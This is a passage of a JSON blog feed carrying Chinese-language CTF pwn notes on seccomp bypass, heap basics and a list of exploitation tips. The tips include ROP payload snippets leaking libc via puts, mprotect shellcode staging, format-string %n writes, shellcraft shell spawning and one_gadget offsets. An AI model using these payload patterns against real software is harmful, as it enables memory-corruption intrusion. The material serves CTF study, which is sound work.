的过滤规则不影响</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token function\">seccomp_release</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"seccomp error\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token function\">seccomp_release</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  释放</pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0E5NTE4NjA1NTUvYXJ0aWNsZS9kZXRhaWxzLzExNjczODY3Ng==\">https://blog.csdn.net/A951860555/article/details/116738676</span></p>\n<p>这里给出关于 <code>seccomp_load</code>  的定义：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;seccomp.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span> scmp_filter_ctx<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">seccomp_load</span><span class=\"token punctuation\">(</span>scmp_filter_ctx ctx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>Link with <span class=\"token operator\">-</span>lseccomp<span class=\"token punctuation\">.</span></pre></td></tr></table></figure><p>DESCRIPTION：</p>\n<p>Loads the seccomp filter provided by ctx into the kernel; if the function succeeds the new seccomp filter will be active when the  <code>function returns</code> .  函数返回时过滤开始运行</p>\n<p>返回值：Returns zero on success or one of the following error codes on failure；成功时返回  <code>0</code> ，失败返回对应错误代码</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tYW4uYXJjaGxpbnV4Lm9yZy9tYW4vc2VjY29tcF9sb2FkLjMuZW4jREVTQ1JJUFRJT04=\">https://man.archlinux.org/man/seccomp_load.3.en#DESCRIPTION</span></p>\n<h1 id=\"3使用seccomp-tools\"><a class=\"anchor\" href=\"#3使用seccomp-tools\">#</a> 3. 使用 seccomp-tools</h1>\n<p>命令：<br />\nseccomp-tools dump ./pwn</p>\n<p>此处用 buuctf 例题  <code>orw</code>  说明：<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/23/pPTmaJx.png\" alt=\"\" /></p>\n<h1 id=\"4绕过\"><a class=\"anchor\" href=\"#4绕过\">#</a> 4. 绕过</h1>\n<p>一般运用 orw 函数的方式进行读取 flag</p>\n<h1 id=\"5注意\"><a class=\"anchor\" href=\"#5注意\">#</a> 5. 注意</h1>\n<p>当使用了 prctl (4, 0) 时</p>\n<p>4 对应的宏是 <code>PR_SET_DUMPABLE</code> ，第二个参数为 0 的话则不能被 dump，为 1 可以被 dump。换句话说，该程序我们无法使用 seccomp-tools dump ./pwn 来查看其系统调用情况，只能靠阅读代码分析。同时在进行 gdb 调试时，执行到 prctl (4, 0) 这行时程序也会被终止。不过只要以 root 身份执行，那么 <code>secccomp-tools</code>  和 gdb 调试都没问题，估计应该是限制了一般身份用户的 dump 行为</p>\n<p>参考：<br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8zNjMxNzQ1NjE=\">https://zhuanlan.zhihu.com/p/363174561</span></p>\n",
            "tags": [
                "pwn",
                "二进制"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/08/24/pwn/%E5%A0%86/%E5%A0%86/",
            "url": "https://vvwwvv.cn/2023/08/24/pwn/%E5%A0%86/%E5%A0%86/",
            "title": "堆",
            "date_published": "2023-08-24T12:15:56.000Z",
            "content_html": "<p>chunk 的 p 位设为 1 即上一个 chunk 被使用并且上一个 chunk 可以使用 pre_size 的空间  （用来储存前一个物理相邻的 chunk 的数据 ，（两个都空闲才合并）</p>\n",
            "tags": [
                "pwn",
                "二进制",
                "Linux"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/08/24/pwn/PWN%E9%9B%B6%E7%A2%8E%E7%9F%A5%E8%AF%86/",
            "url": "https://vvwwvv.cn/2023/08/24/pwn/PWN%E9%9B%B6%E7%A2%8E%E7%9F%A5%E8%AF%86/",
            "title": "PWN小技巧",
            "date_published": "2023-08-24T11:23:15.000Z",
            "content_html": "<h1 id=\"centerpwn小技巧center\"><a class=\"anchor\" href=\"#centerpwn小技巧center\">#</a> &lt;center&gt;PWN 小技巧 &lt;/center&gt;</h1>\n<h3 id=\"164位程序与32位程序payload\"><a class=\"anchor\" href=\"#164位程序与32位程序payload\">#</a> 1.64 位程序与 32 位程序 payload</h3>\n<p>​<br />\n64 位程序 payload 要先用 pop_rdi 覆盖 ret 然后依次是 调用函数的参数，调用函数本身，最后是返回地址（32 位程序传参不需要用寄存器）<br />\n32 位程序是调用函数 <strong>先函数本身</strong> ，然后是函数返回地址，再是参数</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>payload<span class=\"token operator\">=</span><span class=\"token string\">b\"\\x00\"</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x50</span><span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rdi_ret<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>put_got<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>put_plt<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x4009A0</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><pre><code>先是垃圾字符，然后pop_rdi,接着put_got是利用执行put_plt泄露的地址，最后是返回地址\n</code></pre>\n<h3 id=\"2注意栈对齐ubuntu18以上格外注意\"><a class=\"anchor\" href=\"#2注意栈对齐ubuntu18以上格外注意\">#</a> 2. 注意栈对齐（Ubuntu18 以上格外注意）</h3>\n<h3 id=\"3泄露的函数接收时需要看其最后返回地址的函数是否有输出字符串如有则先接收返回地址输出的字符串\"><a class=\"anchor\" href=\"#3泄露的函数接收时需要看其最后返回地址的函数是否有输出字符串如有则先接收返回地址输出的字符串\">#</a> 3. 泄露的函数接收时，需要看其最后返回地址的函数是否有输出字符串，如有则先接收返回地址输出的字符串</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>payload<span class=\"token operator\">=</span><span class=\"token string\">b\"\\x00\"</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x50</span><span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rdi_ret<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>put_got<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>put_plt<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>返回地址<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Input your Plaintext to be encrypted\\n\"</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    p<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\">#返回地址中输出的字符串</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    p<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\">#返回地址中输出的字符串</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    puts<span class=\"token operator\">=</span>u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    接收最好用这个 puts<span class=\"token operator\">=</span>u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>【有时会直接输出地址以 16 进制形式，我们要直接进行接收】</p>\n<p>例一、</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Yippie, lets crash: %p\\n\"</span><span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 例如这种输出</span></pre></td></tr></table></figure><p>接收方式：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>stack<span class=\"token operator\">=</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#接收回显的参数在栈上的地址，长度是 10，以 16 进制表示</span></pre></td></tr></table></figure><p>例二、</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">__isoc99_scanf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%6s\"</span><span class=\"token punctuation\">,</span> format<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 此处输入的是  %7$p  泄露偏移为 7 的地方的值</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span>format<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>   <span class=\"token comment\">// 打印上面泄露的值</span></pre></td></tr></table></figure><p>接收</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b\"0x\"</span><span class=\"token punctuation\">)</span>                   <span class=\"token comment\">#原本输出值为 0x76d7e5e9e493e00</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>stroy<span class=\"token operator\">=</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span>       <span class=\"token comment\">#以 16 进制接收 16 个字符</span></pre></td></tr></table></figure><h3 id=\"4有时接收不能用u64precv会出错利用-u64precvuntilbn-1ljust8b0\"><a class=\"anchor\" href=\"#4有时接收不能用u64precv会出错利用-u64precvuntilbn-1ljust8b0\">#</a> 4. 有时接收不能用 u64 (p.recv ()), 会出错，利用 u64 (p.recvuntil (b'\\n')[:-1].ljust (8,b'\\0'))</h3>\n<h3 id=\"5遇到要绕过strlen函数要绕过时用-bx00-截断\"><a class=\"anchor\" href=\"#5遇到要绕过strlen函数要绕过时用-bx00-截断\">#</a> 5. 遇到要绕过 strlen 函数要绕过时用 b&quot;\\x00&quot; 截断</h3>\n<h3 id=\"6系统调用是调用execvebinshnullnull平常调用为systembinsh\"><a class=\"anchor\" href=\"#6系统调用是调用execvebinshnullnull平常调用为systembinsh\">#</a> 6. 系统调用是调用 execve (&quot;/bin/sh&quot;,NULL,NULL)【平常调用为 system (&quot;/bin/sh&quot;)】</h3>\n<pre><code>32位程序系统调用号用 eax 储存, 第一 、 二 、 三参数分别在 ebx 、ecx 、edx中储存。 可以用 int 80 汇编指令调用（）\n\n当eax=11时即为系统调用号调用命令execve，参数&quot;/bin/sh&quot;赋给ebx\n</code></pre>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/16/pPfQR56.png\" alt=\"\" /></p>\n<pre><code>64位程序系统调用号用 rax 储存, 第一 、 二 、 三参数分别在 rdi 、rsi 、rdx中储存。 可以用 syscall 汇编指令调用\n</code></pre>\n<h3 id=\"7有mprotect函数可以改变内存的读写权限\"><a class=\"anchor\" href=\"#7有mprotect函数可以改变内存的读写权限\">#</a> 7. 有 mprotect 函数可以改变内存的读写权限</h3>\n<pre><code>mprotect(起始地址，修改内存长度，修改的权限（修改为7） )\n\n指定的内存区间必须包含整个内存页(4k)，起始地址必须是页的起始地址(末尾为00?),修改区间的长度必须是页的整数倍\n\nmem_addr (起始地址)= 0x80EB000   mem_size(内存长度) = 0x1000   mem_proc(权限) = 0x7 【32位程序时也可以找任意三个寄存器来传参(如pop ebx;pop exi;pop ebp;ret)，为了控制后续的返回地址】\n\n在可以利用执行shellcode时可以用，修改一个位置可执行，然后调用read存入shellcode加以执行\n\npayload=b&quot;a&quot;*0x2d\n\npayload+=p32(mprotect)+p32(pop_ret)+p32(plt_got)+p32(0x100)+p32(0x7)\n\n此处没有覆盖ebp，因为查看汇编ebp还未入栈，所以直接覆盖ret，后面的为调用3个寄存器\n\npayload+=p32(read)+p32(pop_ret)+p32(0)+p32(plt_got)+p32(0x100)+p32(plt_got)\n\n返回地址为read，\n\n此处调用顺序为 执行函数，寄存器_返回地址，参数，函数返回地址(32位程序下，与一般32位不同，一般不调用寄存器)\n</code></pre>\n<h3 id=\"8shellcode编写\"><a class=\"anchor\" href=\"#8shellcode编写\">#</a> 8.shellcode 编写</h3>\n<pre><code>用pwntools生成：\n\nshellcode = asm(shellcraft.sh())\n\nshellcode网址（用的时候不知道为什么不行）：\n\n[https://www.exploit-db.com/](https://www.exploit-db.com/ &quot;漏洞利用数据库 - 渗透测试人员、研究人员和道德黑客的漏洞利用 (exploit-db.com)&quot;)\n\n[http://shell-storm.org/shellcode/index.html](http://shell-storm.org/shellcode/index.html &quot;Shellcodes database for study cases (shell-storm.org)&quot;)\n</code></pre>\n<h3 id=\"9strcmp绕过\"><a class=\"anchor\" href=\"#9strcmp绕过\">#</a> 9.strcmp () 绕过</h3>\n<p><img data-src=\"https://img-blog.csdnimg.cn/fc1eb2d3cb7a463e8599114af5c2da07.png\" alt=\"\" /></p>\n<h5 id=\"str1str2时返回0一般用这个绕过也可以用x00截断\"><a class=\"anchor\" href=\"#str1str2时返回0一般用这个绕过也可以用x00截断\">#</a> str1=str2 时返回 0，一般用这个绕过，也可以用 \\x00 截断</h5>\n<h3 id=\"10switch语句\"><a class=\"anchor\" href=\"#10switch语句\">#</a> 10.switch () 语句</h3>\n<pre><code>switch(表达式)&#123; \n    case 常量表达式1:  语句1;\n    case 常量表达式2:  语句2;\n    … \n    case 常量表达式n:  语句n;\n    default:  语句n+1;\n\n&#125;\n</code></pre>\n<h5 id=\"将表达式的结果与常量表达式依次比较直到相同\"><a class=\"anchor\" href=\"#将表达式的结果与常量表达式依次比较直到相同\">#</a> 将表达式的结果与常量表达式依次比较直到相同</h5>\n<h3 id=\"11-栈溢出注意输入的payload是不是再栈上有时不是输入在栈上后面可能会调用strcpy此时可能会将输入的payload复制到栈上需要按照复制后的栈填充垃圾字符等等\"><a class=\"anchor\" href=\"#11-栈溢出注意输入的payload是不是再栈上有时不是输入在栈上后面可能会调用strcpy此时可能会将输入的payload复制到栈上需要按照复制后的栈填充垃圾字符等等\">#</a> 11. 栈溢出注意输入的 payload 是不是再栈上，有时不是输入在栈上，后面可能会调用 strcpy ()，此时可能会将输入的 payload 复制到栈上，需要按照复制后的栈填充垃圾字符等等</h3>\n<h3 id=\"12整数溢出漏洞比大小绕过判断\"><a class=\"anchor\" href=\"#12整数溢出漏洞比大小绕过判断\">#</a> 12. 整数溢出漏洞（比大小绕过判断），</h3>\n<pre><code>无符号整型 unsigned int 遇到 -1 时会将 -1转化为该无符号整型的最大值\n\nunsigned int ( -1 )=max unsigned int\n\nint (-1)= -1\n\n输入无符号整型时应该输入字符串（”-1“），不能是（b”-1“）\n</code></pre>\n<h3 id=\"13格式化字符串漏洞不仅仅用来泄露canary还可以改变地址内的值\"><a class=\"anchor\" href=\"#13格式化字符串漏洞不仅仅用来泄露canary还可以改变地址内的值\">#</a> 13. 格式化字符串漏洞（不仅仅用来泄露 canary，还可以改变地址内的值）</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>payload<span class=\"token operator\">=</span>pwnme地址（<span class=\"token number\">32</span>位是<span class=\"token number\">4</span>字节）<span class=\"token operator\">+</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">4</span><span class=\"token operator\">+</span><span class=\"token string\">b\"%10$n\"</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    有printf<span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span>会将输入的payload存入buf偏移为<span class=\"token number\">10</span>的地方<span class=\"token punctuation\">(</span>该偏移需要利用aaaa<span class=\"token operator\">-</span><span class=\"token operator\">%</span>p<span class=\"token operator\">-</span><span class=\"token operator\">%</span>p<span class=\"token operator\">-</span><span class=\"token operator\">%</span>p<span class=\"token operator\">-</span><span class=\"token operator\">%</span>p<span class=\"token operator\">-</span><span class=\"token operator\">%</span>p<span class=\"token operator\">-</span><span class=\"token operator\">%</span>p<span class=\"token operator\">-</span><span class=\"token operator\">%</span>p<span class=\"token operator\">-</span><span class=\"token operator\">%</span>p<span class=\"token operator\">-</span><span class=\"token operator\">%</span>p<span class=\"token operator\">-</span><span class=\"token operator\">%</span>p<span class=\"token operator\">-</span><span class=\"token operator\">%</span>p<span class=\"token operator\">-</span><span class=\"token operator\">%</span>p<span class=\"token operator\">-</span><span class=\"token operator\">%</span>p<span class=\"token operator\">-</span><span class=\"token operator\">%</span>p<span class=\"token operator\">-</span><span class=\"token operator\">%</span>p<span class=\"token operator\">-</span><span class=\"token operator\">%</span>p查看<span class=\"token punctuation\">)</span>，并且将<span class=\"token operator\">%</span><span class=\"token number\">10</span>$前面的八字节大小视作<span class=\"token number\">8</span>存入该地址</pre></td></tr></table></figure><pre><code>http://t.csdn.cn/1sJDx\n</code></pre>\n<h3 id=\"14echo-flag-systemecho-flag\"><a class=\"anchor\" href=\"#14echo-flag-systemecho-flag\">#</a> 14.echo flag 【system(&quot;echo flag&quot;)】</h3>\n<pre><code>输出字符串，后面跟什么就输出什么，这里输出&quot;flag&quot;\n</code></pre>\n<h3 id=\"15valatoistr\"><a class=\"anchor\" href=\"#15valatoistr\">#</a> 15.val=atoi(str)</h3>\n<pre><code>将str转为整数型字符串，当第一个字符不能识别为数字时，函数将停止读入输入字符串\n\nstr=&quot;987654&quot; ,val=(int)987654\n\nstr=&quot;abc&quot; ,      val=0\n</code></pre>\n<h3 id=\"16-charmallocxsizeofchar\"><a class=\"anchor\" href=\"#16-charmallocxsizeofchar\">#</a> 16. (char*)malloc(x*sizeof(char))</h3>\n<pre><code>分配x字节连续的空间，从堆空间中分配，返回值为分配空间的首地址\n</code></pre>\n<h3 id=\"1732位程序构造rop链时\"><a class=\"anchor\" href=\"#1732位程序构造rop链时\">#</a> 17.32 位程序构造 rop 链时</h3>\n<pre><code>因为32位程序是用栈来传参，调用函数返回地址在前参数在后，所以顺序应当为 ：\n\n函数1+函数2+函数3+函数1的参数+函数2的参数+函数3的参数\n</code></pre>\n<h3 id=\"18修改glibc版本ldd-version-查看当前版本\"><a class=\"anchor\" href=\"#18修改glibc版本ldd-version-查看当前版本\">#</a> 18. 修改 glibc 版本（ldd --version  查看当前版本）</h3>\n<p>当本地 glibc 版本不同会导致堆的地址不同等问题（glibc2.26 版本之后会出现一个新的 TcacheBin，导致释放的 chunk 不会先进入 fastbin 中）</p>\n<pre><code>patchelf --set-interpreter ~/pwn/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so --set-rpath ~/pwn/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ ~/Downloads/buuctf/babyheap_0ctf_2017\n</code></pre>\n<p>进入到 /pwn/glibc-all-in-one (自己的目录下)，cat list</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/13/pPRkcxf.png\" alt=\"\" /></p>\n<p>用 ./download 下载我们需要的版本</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/13/pPRkoin.png\" alt=\"\" /></p>\n<p>使用上面的命令换版本即可</p>\n<p>【下载不超过请换源，vim download, 注释掉清华源，放出官方源】</p>\n<h3 id=\"19-关于malloc_hook\"><a class=\"anchor\" href=\"#19-关于malloc_hook\">#</a> 19. 关于 malloc_hook</h3>\n<p><code>malloc_hook</code>  指向的地址不为空时则执行其指向的函数，可以以此来 gadget（配合  <code>one_gadget</code>  使用）</p>\n<pre><code>malloc_hook=main_arena-0x10\n\n一般：\nfake_chunk=mian_arena-0x33\n所以 malloc_hook=fake_chunk+0x23\n</code></pre>\n<h3 id=\"20-使用one_gadget工具来得到getshell的函数地址在对应的库目录下使用\"><a class=\"anchor\" href=\"#20-使用one_gadget工具来得到getshell的函数地址在对应的库目录下使用\">#</a> 20. 使用 one_gadget 工具来得到 getshell 的函数地址（在对应的库目录下使用）</h3>\n<p>该工具是基于对应的库来查找的，所以使用时 真正地址为 libc_base + 地址， <strong>下面的需要让 rax 满足对应的要求</strong><br />\n one_gadget 对应的库<br />\n（例如：one_gadget <span class=\"exturl\" data-url=\"aHR0cDovL2xpYmMtMi4yMy5zbw==\">libc-2.23.so</span> , 得到如下结果）<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/14/pPRzZNV.png\" alt=\"\" /></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vdW5yNHYzMS9wLzE1MTczODExLmh0bWw=\">https://www.cnblogs.com/unr4v31/p/15173811.html</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMjcyMA==\">https://xz.aliyun.com/t/2720</span></p>\n<p>one_gadget，这里记一下比较常用的（libc2.23-0ubuntu11.2 版本已经不在使用）：</p>\n<pre><code>og1=[0x45216,0x4526a,0xf02a4,0xf1147]    #libc2.23-0ubuntu11.2\nog2=[0x45226,0x4527a,0xf0364,0xf1207]    #libc2.23-0ubuntu11.3\n</code></pre>\n<p>下面是利用 read 与 gadget 地址的关系爆破修改（1/16 概率）</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYnMua2FueHVlLmNvbS90aHJlYWQtMjYxMTEyLmh0bQ==\">https://bbs.kanxue.com/thread-261112.htm</span></p>\n<h3 id=\"21查询程序对应glibc版本\"><a class=\"anchor\" href=\"#21查询程序对应glibc版本\">#</a> 21. 查询程序对应 glibc 版本</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubmd1aS5jYy9lbC8zMzI3NzgzLmh0bWw/YWN0aW9uPW9uQ2xpY2s=\">https://www.ngui.cc/el/3327783.html?action=onClick</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYnMua2FueHVlLmNvbS90aHJlYWQtMjY5MTU1Lmh0bQ==\">https://bbs.kanxue.com/thread-269155.htm</span></p>\n<pre><code>ldd 程序名  //用ldd命令查看当前对应glibc版本\n</code></pre>\n<p>1.ubuntu 16 环境（glibc 2.23~glibc 2.26）</p>\n<p>2.ubuntu18<sub>ubuntu20 环境（glibc2.26</sub>glibc2.32）</p>\n<p>机制更新</p>\n<p>(1) 在 glibc2.26 之后堆管理器中加入了 tcachebin，tcachebin 是 glibc 2.26 版本引入的一种优化机制，用于管理小型内存块的缓存，以加速内存分配和释放的性能。在 tcachebin 中每种大小的堆块最多只能存放 7 个。</p>\n<p>加入了 tcachebin 后，释放的堆块就会优先进入 tcachebin 中，只有当释放的堆块是一个 large bin chunk (大小大于 0x410)，或者 tcachebin 对应大小的堆块已经满 7 个时才会置入 fastbin 或 unsortedbin 中</p>\n<p>(2) 在加入了 tcachebin 后堆管理器在初始化时会先 malloc 一块大小为 0x251 的堆块存放 tcachebins 中指针</p>\n<p>利用方式（要想堆块释放后进入 unsortedbin 中就要绕过 tcachebin，由于程序有堆块申请数量限制难以填满 tcachebin 所以选择 free 一个大小大于 0x410 的堆块）</p>\n<h3 id=\"22fopenarg1arg2\"><a class=\"anchor\" href=\"#22fopenarg1arg2\">#</a> 22.fopen(&quot;arg1&quot;,&quot;arg2&quot;)</h3>\n<p>arg1 为打开文件名，arg2 为打开文件的访问模式（读写等方式）</p>\n<p>文件不存在则返回 NULL</p>\n<h3 id=\"23gdb本地调试\"><a class=\"anchor\" href=\"#23gdb本地调试\">#</a> 23.gdb 本地调试</h3>\n<pre><code class=\"language-pyhton\">from pwn import *\np=process('./ez_pz_hackover_2016')\ncontext.log_level='debug'\n \ngdb.attach(p)  ## 会在此处再打开一个终端\n# 'b *0x8048600'  ##在该终端下设置对应断点（要设置在对应函数结束之前），设置完后必须在新终端按下“c”来继续进行，再在旧终端里按下回车\n，\np.recvuntil('crash: ')\nstack=int(p.recv(10),16)#接收s在栈上的地址\n\npayload='crashme\\x00'+'aaaaaa'#crashme\\x00绕过if判断      \n\npause()  #必须要在发送的payload前面，不然直接发送结束无法查询了\np.sendline(payload)\n \npause()  #必要的，不能少\n</code></pre>\n<p>此处的重点就是在发送 <code>payload</code>  前加入 <code>gdb.attach(p)</code>  和 <code>pause</code> ，发送 <code>payload</code>  后加入 <code>pause()</code> ，然后在产生的新终端内设置断点（也可以在前面直接设置断点： <code>gdb.attach(p,&quot;b *0x8048600&quot;)</code> ）</p>\n<p>然后新终端内输入 <code>c</code>  继续执行，旧终端内按下回车便可以进行查询得到相应的栈情况</p>\n<p>不知道为什么要加入两个 <code>pause（）</code> 才行，前面一个防止程序直接发送结束，无法加入断点；后面一个不加入会导致无法读取栈的情况（程序貌似没有运行结束，个人猜测是设置断点的地方已经不需要栈了）</p>\n<h3 id=\"24命令readelf-s-程序名\"><a class=\"anchor\" href=\"#24命令readelf-s-程序名\">#</a> 24. 命令 readelf -s 程序名</h3>\n<p>直接在终端上运行命令 <code>readelf -s 程序名</code>  可以查看表项（利用 ida 也可以查看）<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/20/pPIFR29.png\" alt=\"\" /></p>\n<h3 id=\"2564位构造csu\"><a class=\"anchor\" href=\"#2564位构造csu\">#</a> 25.64 位构造 csu</h3>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/21/pPIT7JU.png\" alt=\"\" /></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">csu</span><span class=\"token punctuation\">(</span>rbx<span class=\"token punctuation\">,</span>rbp<span class=\"token punctuation\">,</span>r12<span class=\"token punctuation\">,</span>r13<span class=\"token punctuation\">,</span>r14<span class=\"token punctuation\">,</span>r15<span class=\"token punctuation\">,</span>ret<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    payload<span class=\"token operator\">=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>csu1<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rbx<span 